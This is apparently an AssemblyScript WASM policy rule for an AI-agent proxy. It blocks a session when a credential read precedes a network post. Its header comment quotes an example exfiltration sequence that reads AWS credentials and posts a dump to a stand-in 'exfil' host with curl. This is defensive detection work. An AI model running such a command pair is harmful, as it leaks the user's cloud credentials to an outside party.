/**
 * A credential was read, then the session posted to the network.
 *
 * Order matters, not presence: reading a secret is routine, and posting to the
 * network is routine — it is the read landing *before* the post, in the same
 * session, that turns two benign actions into exfiltration. Reads `tool_sequence`
 * (the full rolling window), not `new_tool_calls`, because the read and the send
 * are commonly different turns.
 *
 * Traces to `packages/proxy/tests/corpus_support/mod.rs`'s `exfil_succession`
 * mutator: `cat ~/.aws/credentials` then `curl -d @dump.txt https://exfil...`,
 * run through the real classifier so the tokens below are what production
 * actually emits, not what this rule assumes it emits. The proxy already blocks
 * this natively (`ForbiddenSuccessionDetector`, same two tokens) — this rule
 * exists as a worked example of a WASM rule reproducing a real, corpus-backed
 * attack class, not as an enforcement gap the native detector leaves open.
 *
 * ## Using this rule
 *
 *     intutic policy compile --src rules/secret-read-to-egress/rule.ts --out build/secret-read-to-egress.wasm
 *     intutic policy test --wasm build/secret-read-to-egress.wasm --mock rules/secret-read-to-egress/block.json
 *     intutic policy test --wasm build/secret-read-to-egress.wasm --mock rules/secret-read-to-egress/allow.json
 *     intutic policy install --wasm build/secret-read-to-egress.wasm --name secret-read-to-egress
 *
 * `block.json` and `allow.json` beside this file are the two contexts the rule
 * is asserted against in CI. The allow mock is the sharper of the two: the same
 * two tokens, reversed — a post that happens to precede an unrelated later read
 * is not exfiltration, and a rule that checked presence of both without order
 * would block it anyway.
 *
 * Verdict codes: 0 allow, 1 block, 3 reask. 2 is deprecated — the proxy maps
 * it to a block, so a rule returning it believing it redacts gets a block.
 */
import { RequestContext, readContext } from "../../assembly/index";

export { allocate } from "../../assembly/index";

export function rule(ctx: RequestContext): i32 {
  let sawSecretRead = false;
  for (let i = 0; i < ctx.tool_sequence.length; i++) {
    const t = ctx.tool_sequence[i];
    if (t == "action:secret_read") sawSecretRead = true;
    else if (t == "action:http_post" && sawSecretRead) return 1;
  }
  return 0;
}

/** The ABI the proxy calls. Keep the signature exactly as it is. */
export function evaluate(offset: i32, len: i32): i32 {
  return rule(readContext(offset, len));
}
